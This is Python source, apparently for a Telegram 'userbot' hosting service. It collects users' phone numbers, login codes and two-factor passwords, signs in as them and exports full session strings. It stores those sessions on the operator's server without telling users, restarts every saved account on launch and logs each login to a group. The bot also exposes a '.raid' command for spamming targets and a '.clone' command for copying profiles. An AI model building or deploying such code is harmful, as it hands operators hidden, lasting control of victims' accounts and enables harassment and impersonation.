HELP_TEXT = """🛠️ **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ - ʜᴇʟᴘ ᴍᴇɴᴜ** 🛠️\n🔹 `.alive` - ᴄʜᴇᴄκ sʏsᴛᴇᴍ ʟᴏɢs & ᴜᴘᴛɪᴍᴇ sᴛᴀᴛᴜs.\n🔹 `.ping` - ᴄʜᴇᴄᴋ ᴀssɪsᴛᴀɴᴛ ʟᴀᴛᴇɴᴄʏ sᴘᴇᴇᴅ.\n🔹 `.tagall [text]` - ᴍᴇɴᴛɪᴏɴ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs.\n🔹 `.onetag` - sɪɴɢʟᴇ ᴛᴀɢ sᴇǫᴜᴇɴᴄᴇ.\n🔹 `.raid [count]` - ᴛᴀʀɢᴇᴛ sᴘᴇᴄɪғɪᴄ ʀᴇᴘʟɪᴇs ᴏʀ ᴅᴍs.\n🔹 `.afk [reason]` - sᴡɪᴛᴄʜ ᴛᴏ ᴏғғʟɪɴᴇ ᴍᴏᴅᴇ.\n🔹 `.clone @username` - ᴄʟᴏɴᴇ ᴘʀᴏғɪʟᴇ sᴛʀᴜᴄᴛᴜʀᴇ.\n🔹 `.stop` - ᴋɪʟʟ ᴀʟʟ ʀᴜɴɴɪɴɢ ʟᴏᴏᴘs."""
GUIDE_TEXT = """📖 **<b><b>ᴄᴏᴅᴇʀɴᴏᴠᴀ - ᴜsᴇʀʙᴏᴛ ɢᴜɪᴅᴇ</b></b>** 📖\n\n🗂️ **ᴀʟʟ sʏsᴛᴇᴍ ᴇxᴀᴍᴘʟᴇs:**\n\n𝟷. **ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ:** ɴᴜᴍʙᴇʀ ᴇɴᴛᴇʀ ᴋᴀʀᴋᴇ ᴏᴛᴘ sᴘᴀᴄᴇ ᴋᴇ sᴀᴛʜ ᴠᴇʀɪғʏ ᴋᴀʀᴇɪɴ.\n𝟸. **sᴀᴠᴇ sᴇssɪᴏɴ:** ᴀᴜᴛᴏᴍᴀᴛɪᴄ sᴀғᴇ sᴛᴏʀᴀɢᴇ ᴅᴇᴘʟᴏʏᴍᴇɴᴛ.\n\n🛠️ **<b>ᴄᴍᴅs:</b>** `.help` | `.alive` | `.ping` | `.tagall` | `.onetag` | `.raid` | `.afk` | `.clone` | `.stop`"""

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    add_bot_user(m.from_user.id) # Track the user
    unjoined = await check_force_join(c, m.from_user.id)
    if unjoined:
        btn_layout = []
        for index, ch in enumerate(unjoined, start=1):
            btn_layout.append([InlineKeyboardButton(f"📥 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ {index}", url=f"https://t.me/{ch}")])
        btn_layout.append([InlineKeyboardButton("🔄 ᴠᴇʀɪғʏ ᴍᴇᴍʙᴇʀsʜɪᴘ", callback_data="verify_fsub")])
        return await m.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ!** ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ:", reply_markup=InlineKeyboardMarkup(btn_layout))
    try: await m.reply_animation(animation=START_VIDEO, caption=START_TEXT.format(mention=m.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    except Exception: await m.reply_text(START_TEXT.format(mention=m.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)

@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close": await q.message.delete()
    elif q.data == "verify_fsub":
        unjoined = await check_force_join(c, q.from_user.id)
        if unjoined: await q.answer("❌ ᴀᴀᴘɴᴇ sᴀʙʜɪ ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴇ!", show_alert=True)
        else:
            await q.message.delete()
            try: await c.send_animation(q.message.chat.id, animation=START_VIDEO, caption=START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
            except Exception: await c.send_message(q.message.chat.id, START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    elif q.data == "help_btn": await q.message.edit_text(HELP_TEXT, reply_markup=help_back_button)
    elif q.data == "guide_btn": await q.message.edit_text(GUIDE_TEXT, reply_markup=help_back_button)
    elif q.data == "back_to_start":
        await q.message.delete()
        try: await c.send_animation(q.message.chat.id, animation=START_VIDEO, caption=START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
        except Exception: await c.send_message(q.message.chat.id, START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    elif q.data == "add_btn":
        await q.message.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+𝟿𝟷xxxxxxxxxx):**")
        await q.message.delete()

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid, text = m.from_user.id, m.text
    add_bot_user(uid) # Track the user
    unjoined = await check_force_join(c, uid)
    if unjoined: return
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        try:
            await temp_c.connect()
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **<b>ᴇɴᴛᴇʀ ᴏᴛᴘ</b>**\n\n⚠️ **ɢᴜɪᴅᴇ:** ᴏᴛᴘ ᴋᴏ ʜᴀʀ ᴅɪɢɪᴛ ᴋᴇ ʙᴀᴀᴅ sᴘᴀᴄᴇ ᴅᴇᴋᴀʀ ʜɪ ʙʜᴇᴊᴇɪɴ:\n👉 `1 2 3 4 5` (sᴘᴀᴄᴇs ᴋᴇ sᴀᴛʜ)")
        except errors.FloodWait as e: await m.reply_text(f"⏳ **ᴛᴇʟᴇɢʀᴀᴍ ғʟᴏᴏᴅɪɴɢ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:** ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ᴀғᴛᴇʀ `{e.value}` sᴇᴄᴏɴᴅs.")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif " " in text and text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded:
            user_data[uid].update({"step": "password"})
            await m.reply_text("🔐 **<b>ᴇɴᴛᴇʀ ᴛᴡᴏ-sᴛᴇᴘ ᴘᴀssᴡᴏʀᴅ</b>**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ 𝟸ғᴀ ᴘᴀssᴡᴏʀᴅ:")
        except errors.FloodWait as e: await asyncio.sleep(e.value)
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif uid in user_data and user_data[uid].get("step") == "password":
        try:
            await user_data[uid]["client"].check_password(password=text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    save_local_session(uid, string)
    
    ubot = Client(f"ubot_{uid}", api_id=API_ID, api_hash=API_HASH, session_string=string)
    register_ubot_handlers(ubot)
    await ubot.start()
    running_ubots[uid] = ubot
    
    try:
        await ubot.send_message(
            "me", 
            f"🚀 **sᴇssɪᴏɴ sᴀᴠᴇᴅ sᴜᴄᴄprocess...**\n`{string}`"
        )
    except Exception: pass

    success_msg = f"🎉 **sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴏɢɪɴ!**\n\n🔒 **sᴇᴄᴜʀɪᴛʏ ᴀʟᴇʀᴛ:** ᴀᴀᴘᴋᴀ sᴛʀɪɴɢ sᴇssɪᴏɴ sᴀғᴇ ᴄʟᴏᴜᴅ sᴛᴏʀᴀɢᴇ (sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs) ᴍᴇ sᴇɴᴅ ʜᴏ ɢᴀʏᴀ ʜᴀɪ."
    await bot.send_message(uid, success_msg)
    
    try: await bot.send_message(LOG_GROUP, f"🏁 **<b>ɴᴇᴡ ᴜsᴇʀ ʟᴏɢɪɴ:</b>** ɪᴅ: `{uid}`")
    except Exception: pass
    if uid in user_data: del user_data[uid]

# --- ENGINE STARTUP ---
async def start_services():
    print("[INFO] Launching main Bot Engine...")
    await bot.start()
    saved_sessions = load_local_sessions()
    for u_id, string in saved_sessions.items():
        if int(u_id) == (await bot.get_me()).id: continue
        try:
            ubot = Client(f"ubot_{u_id}", api_id=API_ID, api_hash=API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[int(u_id)] = ubot
            await asyncio.sleep(0.3)
        except Exception: pass
    print("[INFO] All database instances synchronized successfully!")
    await idle()

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    loop.run_until_complete(start_services())
